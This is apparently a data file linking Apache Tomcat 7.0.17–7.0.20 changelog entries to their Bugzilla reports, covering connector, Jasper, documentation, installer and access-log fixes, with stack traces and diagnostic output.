Coyote|Tomcat 7.0.20 (markt)|fix|51557|Ignore HTTP headers that do not comply with RFC 2616 and use header names that are not tokens. (markt)|Newline during a http header field name obscures next value|"Created attachment 27314 [details]
Patch to stop CR & LF in the header.

InternalInputBuffer allows newlines in http header field names. As an example:

Foo: Val1
Bar: Val2
MISS
Hup: Val3

This will lead to a field name of 'MISSHup' and not 'Hup'.

Digging into the specs, I think this goes back to RFC 822 which states:

     field-name  =  1*<any CHAR, excluding CTLs, SPACE, and "":"">

and

     CTL         =  <any ASCII control           ; (  0- 37,  0.- 31.)
                     character and DEL>          ; (    177,     127.)

I think this is saying that field-name should not contain CR or LF.

I've attached a patch that stops CR & LF. Two improvements I could see, if there's agreement with this as a bug, are adding a unit test to TestInternalInputBuffer and changing the code so it disallows space and any other ctrl character in the field name."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51557
Coyote|Tomcat 7.0.20 (markt)|add||Improve error handling for HTTP APR if an error occurs while using sendfile. (markt)|||
Coyote|Tomcat 7.0.20 (markt)|fix||Ensure that when using sendfile, HTTP APR sockets are not added to multiple pollers. This may cause errors during shutdown. (markt)|||
Coyote|Tomcat 7.0.20 (markt)|update||Set reuse flag of final AJP END_RESPONSE packet to 0 if we plan to close the connection. (rjung)|||
Coyote|Tomcat 7.0.20 (markt)|update||Correctly indicate if socket is closing when calling recycle for the AJP NIO processor. Note since the flag is unused in this case there were no bugs triggered by the re-factoring error. (rjung)|||
Jasper|Tomcat 7.0.20 (markt)|fix|51532|JSP files with dependencies in JARs were recompiled on every access leading to poor performance. (markt)|Performance Issue when retriving JAR files during TLD file parsing.|"Migrating from Tomcat 6.0.29 to 7.0.19 a large performance hit was noticed on pages containing lots of custom tags. Page rendering time jumped by an order of magnitude.

Profiling the webapp through Netbeans, we narrowed down the problem to the getJarFile() method inside org.apache.jasper.compiler.ParseController. Screenshots of the Profiler Hotspots and Call Tree from both versions of Tomcat are available here: http://imgur.com/a/ZmeWM

The URL path used to load the JAR file has changed from Tomcat 6. Below are the values as output by the debugger:
Tomcat 6: ""file:/C:/svn/[PATH_TO_PROJECT]/server/target/snapshot/WEB-INF/lib/[OUR_JAR].jar!/""
Tomcat 7: ""jndi:/localhost/snapshot/WEB-INF/lib/[OUR_JAR].jar!/""

A comparison of the getJarFile() methods shows few differences aside from the URL path that could contribute to the problem:
Tomcat 7: org.apache.jasper.compiler.JarURLResource
public JarFile getJarFile() throws IOException {
    URL jarFileUrl = new URL(""jar:"" + jarUrl + ""!/"");
    JarURLConnection conn = (JarURLConnection) jarFileUrl.openConnection();
    conn.setUseCaches(false);
    conn.connect();
    return conn.getJarFile();
}

Tomcat 6: org.apache.japser.compiler.ParserController
private JarFile getJarFile(URL jarFileUrl) throws IOException {
    JarFile jarFile = null;

    if (jarFileUrl != null) {
        JarURLConnection conn = (JarURLConnection) jarFileUrl.openConnection();
        conn.setUseCaches(false);
        conn.connect();
        jarFile = conn.getJarFile();
    }

    return jarFile;
}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51532
Jasper|Tomcat 7.0.20 (markt)|fix|51544|Correctly resolve bean methods in EL so accessible methods that are overridden by inaccessible methods do not cause an IllegalAccessException. (markt)|EL parser problem for EmptyList|"When I return Collections.emptyList() and then use ${list.isEmpty()} in a JSP, a problem occurs (see below). It didn't occur in older Tomcat 7 versions (like 7.0.5).

15:             ${user.names}<br />
16:         </div>
17:     </c:forEach>
18:     <c:if test=""${users.isEmpty()}"">
19:         <div>${msg.noResults}</div>
20:     </c:if>
21: </div>


Stacktrace:] with root cause
java.lang.IllegalAccessException: Class javax.el.BeanELResolver can not access a member of class java.util.Collections$EmptyList with modifiers ""public""
	at sun.reflect.Reflection.ensureMemberAccess(Reflection.java:95)
	at java.lang.reflect.Method.invoke(Method.java:607)
	at javax.el.BeanELResolver.invoke(BeanELResolver.java:467)
	at javax.el.CompositeELResolver.invoke(CompositeELResolver.java:161)
	at org.apache.el.parser.AstValue.getValue(AstValue.java:159)
	at org.apache.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:189)
	at org.apache.jasper.runtime.PageContextImpl.proprietaryEvaluate(PageContextImpl.java:985)
	at org.apache.jsp.WEB_002dINF.jsp.externalUsers_jsp._jspx_meth_c_005fif_005f2(externalUsers_jsp.java:2060)
	at org.apache.jsp.WEB_002dINF.jsp.externalUsers_jsp._jspService(externalUsers_jsp.java:396)
	at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:433)
	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:389)
	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:333)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:304)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:684)
	at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:471)
	at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:402)
	at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:329)
	at org.springframework.web.servlet.view.InternalResourceView.renderMergedOutputModel(InternalResourceView.java:238)
	at org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:262)
	at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1120)
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:890)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51544
Web applications|Tomcat 7.0.20 (markt)|fix|41498|Add the allRolesMode attribute to the Realm configuration page in the documentation web application. (markt)|allRolesMode Realm configuration option not documented|"This option needs to be included in the Realm Configuration HOW-TO Common
features section and possibly in the specific Realm Element attributes tables.

Optionally, the API should be made clearer about the linkage between the server
XML attributes and properties.  This linkage is not obvious without a deep
understanding of Tomcat internals. IMHO, the BaseRealm classes are designed for
""public"" consumption and the API docs should reflect that."|https://bz.apache.org/bugzilla/show_bug.cgi?id=41498
Web applications|Tomcat 7.0.20 (markt)|fix|48997|Fixed some typos and correct cross-referencing to the HTTP Connector documentation with the SSL How-To page of the documentation web application. (markt)|enhance ssl-howto documentation|"1) Please, briefly describe what a keystore is.

2) typo: ""withinthe"" => ""within the""

3) Document that keystore password cannot be empty. Mention following scenarion in the Troubleshooting section:

I created my keystore using ""openssl pkcs12 ..."" and entered an empty password. After restarting Tomcat, catalina log contained ""java.io.IOException: failed to decrypt safe contents entry: java.lang.ArithmeticException: / by zero"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=48997
Web applications|Tomcat 7.0.20 (markt)|fix|49122|Improvements and fixes for index page for ROOT web application. Based on a patch provided by pidster. (markt)|Update of ROOT application index.html|"The patch adds a new paragraph at the top of the page, recommending that users join the low volume Tomcat Announce list and adds a link to the appropriate subscription email address.

The patch also replaces the table based layout with a standards compliant CSS version, which is largely visually identical."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49122
Web applications|Tomcat 7.0.20 (markt)|fix|51516|Correct documentation web application to show correct system property name for changing the name of the SSO session cookie. (markt)|org.apache.catalina.SSO_SESSION_COOKIE_NAME vs org.apache.catalina.authenticator.Constants.SSO_SESSION_COOKIE_NAME|"In Apache Tomcat Configuration Reference - System Properties document, It has been suggested to use system variable org.apache.catalina.SSO_SESSION_COOKIE_NAME to change single sign on session cookie name. It's not working.


After analyzing tomcat source, Its found that, we have to use org.apache.catalina.authenticator.Constants.SSO_SESSION_COOKIE_NAME instead of org.apache.catalina.SSO_SESSION_COOKIE_NAME. Please correct Apache Tomcat Configuration Reference document.


In org.apache.catalina.authenticator.Constants.Java

public static final String SINGLE_SIGN_ON_COOKIE = System.getProperty(            ""org.apache.catalina.authenticator.Constants.SSO_SESSION_COOKIE_NAME"",""JSESSIONIDSSO"");"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51516
Web applications|Tomcat 7.0.20 (markt)|update||"Configure the Manager and Host Manager web applications with the Set Character Encoding Filter to make the default request character encoding UTF-8 to improve i18n support. Note that best results will be obtained if the connector is also configured with URIEncoding=""UTF-8"".(markt)"|||
Web applications|Tomcat 7.0.20 (markt)|update||Update the documentation web application to be even more explicit about the implications of setting the path attribute on a Context element in server.xml. (markt)|||
Web applications|Tomcat 7.0.20 (markt)|fix|51561|"Update the Realm page within the documentation web application to recommend the use of digest.[bat|sh] to generate digests rather than calling RealmBase directly. (markt)"|Missing tomcat-coyote.jar from classpath requirement on Realm HowTo page, digested passwords section|"It appears that starting in version 7.0.16, HexUtils.class exists in tomcat-coyote.jar instead of its previous home, catalina.jar.

On page:  http://tomcat.apache.org/tomcat-7.0-doc/realm-howto.html

Under Common Features > Digested Passwords
Current text:

To use either of the above techniques, the following jar files will need to be on your class path to make the RealmBase class available: 

$CATALINA_HOME/bin/tomcat-juli.jar 
$CATALINA_HOME/lib/catalina.jar 
$CATALINA_HOME/lib/tomcat-util.jar 


Needs to be updated to also include:
$CATALINA_HOME/lib/tomcat-coyote.jar"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51561
Web applications|Tomcat 7.0.20 (markt)|fix|51567|Update the class loading page of the documentation web application to include information on the search order for the common class loader when separate values are used for $CATALINA_HOME and $CATALINA_BASE. (markt)|Classloader docs don't address CATALINA_BASE|The http://tomcat.apache.org/tomcat-7.0-doc/class-loader-howto.html docs do a great job of defining the priority of classloaders for a deployment where CATALINA_HOME is the same as CATALINA_BASE.  Through some experimentation it appears CATALINA_BASE/lib is also searched for classes.  It would be nice to see the docs reflect the additional location(s) searched and the order in which they are.  For example will CATALINA_BASE/lib/some-classes.jar take precedence over CATALINA_HOME/lib/some-classes.jar?|https://bz.apache.org/bugzilla/show_bug.cgi?id=51567
Web applications|Tomcat 7.0.20 (markt)|update||Improve class loading documentation and logging documentation. (kkolinko)|||
Web applications|Tomcat 7.0.20 (markt)|add||Add information to the security page of the documentation web application for the ciphers attribute of the Connector element. (markt)|||
Other|Tomcat 7.0.20 (markt)|fix|51503|Add additional validation to Windows installer that ensure that the shutdown port, HTTP port and AJP port are all specified during the install process. (markt)|"Additional error checking required for connector port attribute (e.g. for port="""")"|"With 7.0.18 packaged as a candidate for release and finally unreleased, when I stop the Tomcat service (only 1 war deployed), the service takes a lot of time to stop and finally was killed by system.

Having a look into the stderr log, I see it paused right after the folowing line :

INFO: Stopping ProtocolHandler [http-apr-0]

Then went into a slow loop and fill the log with these lines :

13 juil. 2011 14:30:30 org.apache.tomcat.util.net.AprEndpoint stopInternal
ATTENTION: Acceptor thread [http-apr-0-Acceptor-0] failed to unlock. Forcing hard socket shutdown.
13 juil. 2011 14:30:31 org.apache.tomcat.util.net.AprEndpoint stopInternal
ATTENTION: Acceptor thread [http-apr-0-Acceptor-0] failed to unlock. Forcing hard socket shutdown.
13 juil. 2011 14:30:32 org.apache.tomcat.util.net.AprEndpoint stopInternal
ATTENTION: Acceptor thread [http-apr-0-Acceptor-0] failed to unlock. Forcing hard socket shutdown.
etc. (about 30 times before it was killed)

I think there was no such issue with 7.0.16."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51503
Other|Tomcat 7.0.20 (markt)|fix|51531|Update sample Eclipse classpath file to reflect updated ECJ jar. Patch provided by Ian Brandt. (markt)|Eclipse .classpath references old ECJ version|The ECJ version referenced by the current Eclipse .classpath resource on trunk is 3.6.2.  The reference Ant build uses ECJ 3.7.|https://bz.apache.org/bugzilla/show_bug.cgi?id=51531
Other|Tomcat 7.0.20 (markt)|update||Convert Tomcat unit tests to JUnit 4. (kkolinko)|||
Other|Tomcat 7.0.20 (markt)|update||Update optional CheckStyle library to 5.4. (kkolinko)|||
Other|Tomcat 7.0.20 (markt)|update||Remove resolveHosts attribute from AccessLogValve configuration in the default server.xml. It was documented in 7.0.19 that it has no effect. (kkolinko)|||
Other|Tomcat 7.0.20 (markt)|update||Simplify mapping for jsp servlet in the default web.xml. (kkolinko)|||
Other|Tomcat 7.0.20 (markt)|fix||Correctly handle uninstall with the Windows installer if the service is installed with a name that contains a '-' character. (markt)|||
Other|Tomcat 7.0.20 (markt)|fix|51598|Prevent direct invocation of the Windows uninstaller without a service name from executing since the uninstall will not be complete. (markt)|NSIS - Running Uninstall.exe without arguments|"Reviewing r1152863

CreateShortCut ""$SMPROGRAMS\Apache Tomcat @VERSION_MAJOR_MINOR@ $TomcatServiceName\Uninstall Tomcat @VERSION_MAJOR_MINOR@.lnk"" \
                 ""$INSTDIR\Uninstall.exe"" '-ServiceName=""$TomcatServiceName""'

The trick of passing argument to Uninstall.exe is a bit flawed:  a user can double click Uninstall.exe in Tomcat installation directory and uninstallation will be launched without this additional argument.

I wonder whether we can derive this name from somewhere (from the name of exe files in bin, or from Registry?) and confirm it,  like uninstaller displays/confirms the name of directory it uninstalls from.

A more simple fix could be to just display a warning and abort deinstallation."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51598
Other|Tomcat 7.0.20 (markt)|fix||Use Tomcat icon (cat) instead of Apache Commons Daemon (feather) one in the list of uninstallable programs on Windows. (kkolinko)|||
Other|Tomcat 7.0.20 (markt)|update||Update to Apache Commons Daemon 1.0.7. (markt)|||
Other|Tomcat 7.0.20 (markt)|fix|51621|Add additional required JARs to the deployer distribution. (markt)|Missing jars in Deployer|"I put to ANT classpath all jars included in ""apache-tomcat-7.0.19-deployer.zip"" (""lib"" dir).
Trying to run the Deployer ANT task ""undeploy"", I got:

java.lang.NoClassDefFoundError: org/apache/tomcat/util/buf/B2CConverter

I added to ANT classpath ""tomcat-coyote.jar"" from Tomcat core distribution (apache-tomcat-7.0.19-windows-x64.zip), and I got:

java.lang.NoClassDefFoundError: org/apache/tomcat/util/res/StringManager

I added to ANT classpath ""tomcat-util.jar"" from Tomcat core distribution (apache-tomcat-7.0.19-windows-x64.zip), and finally I got the task successfully executed.

Therefore, I guess the Deployer distribution should include ""tomcat-coyote.jar"" and ""tomcat-util.jar""."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51621
Other|Tomcat 7.0.20 (markt)|fix||Fix a small number of warnings reported by FindBugs. (markt)|||
Other|Tomcat 7.0.20 (markt)|update||Update to version 1.1.22 of the native component for the AJP APR/native and HTTP APR/native connectors. (markt)|||
Catalina|Tomcat 7.0.19 (markt)|add||Add option to activate access log for unit tests. (rjung)|||
Catalina|Tomcat 7.0.19 (markt)|fix||Fix regression in year number formatting for AccessLogValve. (rjung)|||
Catalina|Tomcat 7.0.19 (markt)|add|46252|Allow to specify character set to be used to write the access log in AccessLogValve. (kkolinko)|Tomcat access log doesn't support Unicode|"AccessLogValve, which is responsible for handling the access log uses FileWriter (that doesn't support Unicode). I guess that instantiating the writer like this would solve the case:

writer = new PrintWriter(new OutputStreamWriter(new FileOutputStream(pathname), ""UTF-8""), true);"|https://bz.apache.org/bugzilla/show_bug.cgi?id=46252
Catalina|Tomcat 7.0.19 (markt)|fix|51494|Prevent an NPE when a long running request completes if the associated web application was destroyed while the request was processing. (markt)|NPE in StandardContextValve.invoke() when a webapp is redeployed while a request is still being processed|"Hi,

The following applies to Tomcat 7.0.18, but I couldn't select that version.

When a request to a Servlet takes a long time to process, and the webapp is redeployed in that time (e.g. by replacing the .war file), the following NPE is thrown in org.apache.catalina.core.StandardContextValve.invoke():

10.07.2011 03:27:05 org.apache.catalina.connector.CoyoteAdapter service
SCHWERWIEGEND: An exception or error occurred in the container during the request processing
java.lang.NullPointerException
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:183)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:462)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:164)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:100)
	at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:754)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:404)
	at org.apache.coyote.http11.Http11AprProcessor.process(Http11AprProcessor.java:274)
	at org.apache.coyote.http11.Http11AprProtocol$Http11ConnectionHandler.process(Http11AprProtocol.java:237)
	at org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:1731)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:662)

This is because ""context"" attribute in StandardContextValve is null at that time.

I could reproduce this behaviour on Windows 7 (32 bit) with Sun/Oracle Java 1.6.0_26, using the Windows x86 binaries of Tomcat 7.0.18 (from http://people.apache.org/~markt/dev/tomcat-7/v7.0.18/) with the included Tomcat Native 1.1.20.


To reproduce:

0) Download and install Tomcat 7.0.18 (I used the windows x86 zip binaries).

1) Create a simple webapp with a servlet, that takes a long time to process requests, e.g. by calling Thread.sleep(). For example, I used:

@WebServlet(""/LongRequest"")
public class LongRequest extends HttpServlet {
	   
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        PrintWriter out = response.getWriter();
        out.println(""Start..."");
    	out.flush();
        
        try {
            Thread.sleep(20000);
        } catch (InterruptedException ex) {
            out.println(ex.toString());
        }
        
        out.println(""Finished."");
        out.close();
    }
}

2) Package the webapp as "".war"" file, and make two versions of that file.

3) Deploy the first version to Tomcat by copying the .war file into the ""webapps"" directory.

4) Open a browser and make a GET request to the above servlet.

5) Now immediately replace the .war file in the webapp directory with the second version, so that Tomcat will undeploy the old version and deploy the new one.

5) After the request finishes, the NPE is thrown.


I originally observed a NPE in StandardWrapperValve.invoke() with Tomcat 7.0.16 that I reported on the users list [1], which occured when the webapp was redeployed while a servlet was still processing a request. However, I couldn't reproduce the NPE in StandardWrapperValve.invoke(), but in StandardContextValve.invoke().


[1] http://markmail.org/message/2tumlfipaotkshst"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51494
Catalina|Tomcat 7.0.19 (markt)|update||Allow choosing a locale for timestamp formatting in AccessLogValve. (rjung)|||
Catalina|Tomcat 7.0.19 (markt)|fix||When generating access logs for errors, log at the Context/Host level if a Context or Host can be identified for the failed request. (markt)|||
Catalina|Tomcat 7.0.19 (markt)|update||Create a directory for access log or error log (in AccessLogValve and in JULI FileHandler) automatically when it is specified as a part of the file name, e.g. in the prefix attribute. Earlier this happened only if it was specified with the directory attribute. (kkolinko)|||
Catalina|Tomcat 7.0.19 (markt)|fix||Log a failure if access log file cannot be opened. (kkolinko)|||
Catalina|Tomcat 7.0.19 (markt)|fix||Use en_US as locale for timestamps in ExtendedAccessLogValve. (rjung)|||
Catalina|Tomcat 7.0.19 (markt)|fix||Use en_US as locale for creationdate in WebdavServlet. (rjung)|||
Coyote|Tomcat 7.0.19 (markt)|update|51477|Support all SSL protocol combinations in the APR/native connector. This only works when using the native library version 1.1.21 or later, which is not yet released. (rjung)|Support all protocol combinations in SSLProtocol of APR Connector|"We have used SSLProtocol=""SSLv3+TLSv1"" with the APR connectors in 6.0.x and 7.0.x successfully to support both SSLv3 and TLSv1 protocols exclusively (no SSLv2 support).  The following openssl s_client connection tests demonstrate this functionality with 7.0.8:

$ openssl s_client -connect eiger.middleware.vt.edu:443 -tls1
CONNECTED(00000003)
...
SSL handshake has read 6158 bytes and written 293 bytes
---
New, TLSv1/SSLv3, Cipher is DHE-RSA-AES256-SHA
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: zlib compression
Expansion: zlib compression
SSL-Session:
    Protocol  : TLSv1
...

$ openssl s_client -connect eiger.middleware.vt.edu:443 -ssl3
CONNECTED(00000003)
...
SSL handshake has read 6027 bytes and written 319 bytes
---
New, TLSv1/SSLv3, Cipher is DHE-RSA-AES256-SHA
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: zlib compression
Expansion: zlib compression
SSL-Session:
    Protocol  : SSLv3
...

$ openssl s_client -connect eiger.middleware.vt.edu:443 -ssl2
15389:error:140A90C4:SSL routines:SSL_CTX_new:null ssl method passed:ssl_lib.c:1453:

Upon upgrading to Tomcat 7.0.16, which includes the fix for https://issues.apache.org/bugzilla/show_bug.cgi?id=51073, our desired protocol combination fails with the expected ""unsupported protocol"" message.  Unfortunately, none of the officially supported strings mentioned at http://tomcat.apache.org/tomcat-7.0-doc/config/http.html#SSL%20Support provide the desired protocol support.  In particular the protocol values are exclusive, where setting SSLProtocol=""SSLv3"" prevents TLSv1 connections and vice versa.  The following s_client tests confirm this behavior:

(7.0.16 with SSLProtocol=""SSLv3"")
$ openssl s_client -connect eiger.middleware.vt.edu:443 -tls1
CONNECTED(00000003)
15696:error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version number:s3_pkt.c:293:

$ openssl s_client -connect eiger.middleware.vt.edu:443 -ssl3
CONNECTED(00000003)
...
SSL handshake has read 6027 bytes and written 319 bytes
---
New, TLSv1/SSLv3, Cipher is DHE-RSA-AES256-SHA
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: zlib compression
Expansion: zlib compression
SSL-Session:
    Protocol  : SSLv3
...


(7.0.16 with SSLProtocol=""TLSv1"")
$ openssl s_client -connect eiger.middleware.vt.edu:443 -tls1
CONNECTED(00000003)
...
SSL handshake has read 6158 bytes and written 293 bytes
---
New, TLSv1/SSLv3, Cipher is DHE-RSA-AES256-SHA
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: zlib compression
Expansion: zlib compression
SSL-Session:
    Protocol  : TLSv1
...

$ openssl s_client -connect eiger.middleware.vt.edu:443 -ssl3
CONNECTED(00000003)
15816:error:14094410:SSL routines:SSL3_READ_BYTES:sslv3 alert handshake failure:s3_pkt.c:1102:SSL alert number 40
15816:error:1409E0E5:SSL routines:SSL3_WRITE_BYTES:ssl handshake failure:s3_pkt.c:539:"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51477
Coyote|Tomcat 7.0.19 (markt)|update||Various refactorings to reduce code duplication and unnecessary code in the connectors. (markt)|||
Coyote|Tomcat 7.0.19 (markt)|fix||Correct regression introduced in 7.0.17 that triggered 400 entries in the AccessLog when using the AJP/BIO connector. (markt)|||
Coyote|Tomcat 7.0.19 (markt)|fix||Fix regression producing invalid MBean names when using IPV6 addresses for connectors. (rjung)|||
Coyote|Tomcat 7.0.19 (markt)|fix||Add missing thread name in RequestProcessor when Servlet 3 Async is used. Fixes null thread name in access log and JMX MBean. (rjung)|||
Coyote|Tomcat 7.0.19 (markt)|fix||Fix CVE-2011-2526. Protect against infinite loops (HTTP NIO) and crashes (HTTP APR) if sendfile is configured to send more data than is available in the file. (markt)|||
Coyote|Tomcat 7.0.19 (markt)|fix||Prevent NPEs when a socket is closed in non-error conditions after sendfile processing when using the HTTP NIO connector. (markt)|||
Cluster|Tomcat 7.0.19 (markt)|update||Remove unnecessary server.xml parsing code for old cluster implementation that does not ship as part of Tomcat 7. (markt)|||
Web applications|Tomcat 7.0.19 (markt)|add||Add additional information to the documentation web application on the benefits and remaining risks when running under a security manager. (markt)|||
Web applications|Tomcat 7.0.19 (markt)|fix|51490|Correct broken HTML in JSP tag plugin examples and improve the <c:if> example to make failures more obvious. Based on suggestions by Charles. (markt)|if.jsp has many bugs and c:if example not useful|"Created attachment 27276 [details]
Three versions of the ""if"" example, including a fix.

See:
  apache-tomcat-7.0.16/webapps/examples/jsp/tagplugin/if.jsp

Small things:
 * Has unclosed font tags and hr tags (old HTML)
 * Has doubled font tags: ""<font <font"" (broken)
 * Uses ""</br>"" sometimes (broken) - should be ""<br/>"" always

Medium thing:
 * The content in the following prints even when it's not working!  E.g., if the jstl.jar is not there!
    <c:if test=""${2>0}"">
        It's true that (2>0)!
    </c:if>
The User Agent simply prints the content of the unknown tag.

Please add after this:
    <br/>
    <c:if test=""${0>2}"">
	  If you see this, then (0>2)! Fail!
    </c:if>


Major things:
 * Must use the old non-XML syntax with .jsp file suffix:
      <%@ taglib uri=""http://java.sun.com/jsp/jstl/core"" prefix=""c"" %>
 * The scope for ""theTruth"" should be ""page"" to avoid testing issues.

If the taglib line is removed and the following is added to the <html> tag:
      xmlns:c=""http://java.sun.com/jsp/jstl/core""
then the example does NOT work, even though it might look like it does!
In this case, ""theTruth"" is still set from if.jsp (if scope=""session"") and the contents of the c:if tag still appear, even with no JSTL processing.

To use xmlns:c rather than the taglib line, the developer must
1) Switch to the .jspx file suffix
2) Use the jsp:root element
3) Or configure Tomcat to treat .jsp as XML

The above is not clear, especially when the example appears to work in many cases when it should not.

I have attached:
1) A fixed if.jsp - please use this.
2) An if.jspx version - please include this for contrast.
3) An if-xmlns.jsp version that does NOT work, but appears to work if if.jsp is visited first.  This is to test the example.

Thanks!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51490
Web applications|Tomcat 7.0.19 (markt)|add||Document ExtendedAccessLogValve. (rjung)|||
Web applications|Tomcat 7.0.19 (markt)|fix||Correct default value of enableLookups for connectors and mention, that resolveHosts for the AccessLogValve is replaced by enableLookups. (rjung)|||
jdbc-pool|Tomcat 7.0.19 (markt)|add||Include jdbc-pool into Tomcat release. (fhanik)|||
Other|Tomcat 7.0.19 (markt)|update||Update to Apache Commons Daemon 1.0.6. (markt)|||
Other|Tomcat 7.0.19 (markt)|update||Update to Eclipse JDT Compiler 3.7. (markt)|||
Catalina|Tomcat 7.0.18 (markt)|fix||Correct regression introduced in 7.0.17 that triggered an NPE if a CrawlerSessionManagerValve was used without setting crawlerUserAgents. (markt)|||
Catalina|Tomcat 7.0.18 (markt)|fix|51466|Correct comment typos in HostManagerServlet. Patch provided by Felix Schumacher. (markt)|typos in comments of HostManagerServlet|"Created attachment 27244 [details]
correct typos

Comment of method stop says ""start"" and two instances of ""if"" are written as ""of""."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51466
Catalina|Tomcat 7.0.18 (markt)|fix|51467|Invoke Thread.start() rather than Thread.run() so that listeners and filters are stopped in a separate thread rather than the current thread. Patch provided by Felix Schumacher. (markt)|usage of method run instead of start to start a thread|"In StandardContext method Thread#run is used. This is most probably a mistake, since a few lines below Thread#join is called to wait for the completion of the thread.

So we could either remove the join and get rid of the thread by using just a runnable, or start the thread."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51467
Catalina|Tomcat 7.0.18 (markt)|fix|51473|Fix concatenation of values in SecurityConfig.setSecurityProperty(). (kkolinko)|"SecurityConfigÔºåset ""package.definition"" security property to ""nullsun.,java.,..."""|"Created attachment 27251 [details]
eclipse debug

In method ""org.apache.catalina.security.SecurityConfig.setSecurityProperty""Ôºå
when i enable the SecurityManagerÔºå
if 'properties' var equals ""package.definition"",
Security.getProperty(properties) will return null,

so

Security.setProperty(properties, definition + packageList); 

will be

Security.setProperty(""package.definition"", null + packageList); 

BTW:

""package.access"" security property no problem„ÄÇ


my jdk:
java version ""1.6.0_20""
Java(TM) SE Runtime Environment (build 1.6.0_20-b02)
Java HotSpot(TM) Client VM (build 16.3-b01, mixed mode, sharing)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51473
Catalina|Tomcat 7.0.18 (markt)|fix||Fix response.encodeURL() for the special case of an absolute URL with no path segment (http://name). (rjung)|||
Coyote|Tomcat 7.0.18 (markt)|fix||Correct regression caused by connector re-factoring that made AJP APR/native connector very unstable on Windows platforms. (markt)|||
Coyote|Tomcat 7.0.18 (markt)|fix||Correct regression caused by connector re-factoring that meant that sendfile data was not reset between pipe-lined HTTP requests. (markt)|||
Tribes|Tomcat 7.0.18 (markt)|update||Re-factor tests to align packages for tests with the classes under test. Start to convert non-JUnit tests to JUnit. Remove unnecessary code. (markt)|||
Tribes|Tomcat 7.0.18 (markt)|fix||Add synchronization to receiver socket binding to prevent test failures on Linux. (markt)|||
Other|Tomcat 7.0.18 (markt)|fix||More code clean-up to remove unused code and reduce IDE warnings. (markt/kkolinko)|||
Other|Tomcat 7.0.18 (markt)|update||Further improvements to the Windows installer. (markt/kkolinko)|||
Catalina|Tomcat 7.0.17 (markt)|add|48956|Add regular expression support for SSI. (markt)|SSI regular expressions not working|"I was trying to use Tomcat SSI filter:

http://tomcat.apache.org/tomcat-6.0-doc/ssi-howto.html

While it generally works, I have discovered that SSI regular expressions are not supported.
As much as I can see from tomcat source code, this feature is just not implemented.

For example, those expressions always return ""did not match"":

<!--#if expr=""abc = /abc/"" -->matches<!--#else -->did not match<!--#endif -->

<!--#if expr=""abc = /[a-z]/"" -->matches<!--#else -->did not match<!--#endif -->

This bug is a showstopper for me, because in my application I need SSI regular expressions support."|https://bz.apache.org/bugzilla/show_bug.cgi?id=48956
Catalina|Tomcat 7.0.17 (markt)|add|49165|Allow any time stamp formats supported by SimpleDateFormat in AccessLogValve. Support logging begin and/or end of request. (rjung)|Enhancement - Allow %{TIME_FORMAT}t As Configuration for AccessLogValve|"AccessLogValve.DateAndTimeElement() can currently be configured only with %t which output the date/time in Common Log Format.

By adding the capability to configure with %{TIME_FORMAT}, one could override (at least) the timeFormatter property of the class ... or it could go further and allow overriding of all the [day, month, year, time]Formatter properties.

Justification for enhancement:  The log currenlty provide the ability to log processing time in millis (via %T), but an accurate log of the order in which requests are received cannot be determined without the capabilities of logging a  a format with milliseconds using the %t element."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49165
